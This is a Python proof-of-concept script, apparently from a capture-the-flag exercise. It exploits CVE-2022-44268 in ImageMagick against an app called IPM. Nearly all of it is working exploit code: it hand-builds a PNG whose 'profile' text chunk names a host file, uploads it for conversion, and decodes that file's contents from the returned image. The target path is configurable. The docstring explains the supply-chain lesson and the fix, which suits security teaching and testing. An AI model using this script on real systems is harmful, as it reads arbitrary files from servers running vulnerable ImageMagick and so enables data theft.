#!/usr/bin/env python3
"""
PoC #8: CVE-2022-44268 - ImageMagick PNG "Raw profile" arbitrary file read
---------------------------------------------------------------------------
This one is NOT a bug in IPM's Java code at all - it is a SUPPLY-CHAIN bug in
the pinned ImageMagick build (7.1.0-48, see Dockerfile). A vulnerable magick
reads a PNG that carries a `tEXt` chunk with keyword `profile` and treats the
chunk's VALUE as a *filename to load a named profile from*. It reads that host
file server-side and embeds its bytes, hex-encoded, into the output PNG as a
`Raw profile type` text chunk.

So an attacker uploads an otherwise-normal PNG whose `profile` chunk points at
the runtime flag file written by entrypoint.sh from IPM_FLAG (see
../Dockerfile) - a file IPM's own convert/upload logic never touches; IPM
converts it with the vulnerable magick; the output PNG that IPM STORs (and
hands back via GET /image/{name}) contains the flag file's bytes, hex-encoded,
in its metadata. We decode it here.

The lesson: the application source can be audited spotless and still ship this,
because the vulnerability rides in a dependency. Fixing it means bumping/patching
ImageMagick (>= 7.1.0-52) and/or a policy.xml that blocks profile reads - not
editing IPM. Track your components (SBOM) and their CVEs.

Confirmation: the recovered bytes are the literal contents of the target file
on the IPM host - something a legitimate image converter can never produce.

Run IPM first, then:  python3 08_cve_2022_44268_png_profile.py [host] [port] [target-file]
                      (target-file defaults to the IPM runtime flag file)
"""
import json
import re
import struct
import sys
import urllib.request
import uuid
import zlib

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
TARGET = sys.argv[3] if len(sys.argv) > 3 else "/home/ctf/ipm/secret/flag.txt"
BASE = f"http://{HOST}:{PORT}"

PNG_SIG = b"\x89PNG\r\n\x1a\n"


# --------------------------------------------------------------------------- #
# Minimal PNG builder - keeps the PoC self-contained (no checked-in payload    #
# file, no Pillow dependency). We hand-build a valid 1x1 RGB PNG and splice in #
# the malicious `profile` tEXt chunk that triggers CVE-2022-44268.             #
# --------------------------------------------------------------------------- #
def _chunk(ctype: bytes, data: bytes) -> bytes:
    return (struct.pack(">I", len(data)) + ctype + data
            + struct.pack(">I", zlib.crc32(ctype + data) & 0xFFFFFFFF))


def craft_payload_png(target_path: str) -> bytes:
    # IHDR: 1x1, 8-bit, colour type 2 (truecolour RGB)
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    # One RGB scanline (filter byte 0 + one green pixel), zlib-compressed.
    idat = zlib.compress(b"\x00\xff\x00\x00")
    # THE PRIMITIVE: keyword "profile" \0 <filename>. A vulnerable magick loads
    # a profile from that path at read time and re-emits it on write.
    text = _chunk(b"tEXt", b"profile\x00" + target_path.encode())
    return (PNG_SIG
            + _chunk(b"IHDR", ihdr)
            + text
            + _chunk(b"IDAT", idat)
            + _chunk(b"IEND", b""))


# --------------------------------------------------------------------------- #
# PNG parsing / raw-profile decode - the Python replacement for the sed one-   #
# liner. We walk the chunks, find the emitted `Raw profile type...` text chunk #
# and hex-decode its body.                                                     #
# --------------------------------------------------------------------------- #
def iter_chunks(png: bytes):
    if not png.startswith(PNG_SIG):
        raise ValueError("not a PNG")
    off = len(PNG_SIG)
    while off + 8 <= len(png):
        (length,) = struct.unpack(">I", png[off:off + 4])
        ctype = png[off + 4:off + 8]
        body = png[off + 8:off + 8 + length]
        yield ctype, body
        off += 12 + length  # 4 len + 4 type + data + 4 crc
        if ctype == b"IEND":
            break


def decode_raw_profile(png: bytes):
    """Return (keyword, decoded_bytes) for the first Raw-profile text chunk."""
    for ctype, body in iter_chunks(png):
        if ctype not in (b"tEXt", b"zTXt"):
            continue
        keyword, _, value = body.partition(b"\x00")
        if not keyword.lower().startswith(b"raw profile"):
            continue
        if ctype == b"zTXt":
            # zTXt value is: <compression-method byte><zlib data>
            value = zlib.decompress(value[1:])
        # ImageMagick raw-profile text format:
        #   "\n<profile-name>\n<length>\n<hex bytes, whitespace-wrapped>"
        # Skip empty lines, find the decimal length line, hex is everything
        # after it. Robust to the exact wrapping/name.
        lines = [ln for ln in value.split(b"\n") if ln.strip()]
        len_idx = next((i for i, ln in enumerate(lines) if ln.strip().isdigit()), 0)
        blob = b"".join(lines[len_idx + 1:])
        hexonly = bytes(c for c in blob if c in b"0123456789abcdefABCDEF")
        return keyword.decode(errors="replace"), bytes.fromhex(hexonly.decode())
    return None, None


# --------------------------------------------------------------------------- #
# HTTP helpers                                                                 #
# --------------------------------------------------------------------------- #
def post_multipart(url, part_name, filename, data, content_type):
    boundary = "----ipmPoC" + uuid.uuid4().hex
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{part_name}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n").encode()
    body += data + b"\r\n" + f"--{boundary}--\r\n".encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.status, r.read().decode(errors="replace")


def get(url):
    with urllib.request.urlopen(url, timeout=30) as r:
        return r.status, r.read()


# --------------------------------------------------------------------------- #
def main():
    print(f"[*] Crafting a PNG whose `profile` chunk points at {TARGET!r}")
    payload = craft_payload_png(TARGET)

    print("[*] Uploading it to /convert (let IPM name the stored result)")
    status, resp = post_multipart(
        f"{BASE}/convert", "image", "innocent.png", payload, "image/png")
    print(f"[*] /convert -> {status} {resp}")
    try:
        body = json.loads(resp)
        name = body["name"]
    except Exception as e:
        print(f"[-] Could not parse a stored name from the response: {e}")
        sys.exit(1)
    if not body.get("stored"):
        print(f"[-] Result not stored ({body.get('storeError')}); cannot fetch it back")
        sys.exit(1)

    print(f"[*] Fetching the converted output back via /image/{name}")
    _, out_png = get(f"{BASE}/image/{name}")
    if not out_png.startswith(PNG_SIG):
        print(f"[-] /image/{name} did not return a PNG: {out_png[:32]!r}")
        sys.exit(1)

    keyword, leaked = decode_raw_profile(out_png)
    if not leaked:
        print("[-] No `Raw profile type` chunk in the output - magick may be patched")
        print("    (>= 7.1.0-52 fixes CVE-2022-44268). Supply chain win if so.")
        sys.exit(1)

    print(f"[+] CVE-2022-44268 confirmed - recovered {len(leaked)} bytes "
          f"of {TARGET} from the output's `{keyword}` chunk:")
    print("-" * 60)
    # Flush the text buffer first so the raw bytes land in order, not before it.
    sys.stdout.flush()
    sys.stdout.buffer.write(leaked if leaked.endswith(b"\n") else leaked + b"\n")
    sys.stdout.buffer.flush()
    print("-" * 60)
    m = re.search(rb"FLAG\{[^}]*\}", leaked)
    if m:
        print(f"[+] Recovered flag: {m.group(0).decode()}")
    print("[+] This is a DEPENDENCY (supply-chain) bug: the fix is upgrading/")
    print("    patching ImageMagick, not editing IPM's source.")


if __name__ == "__main__":
    main()
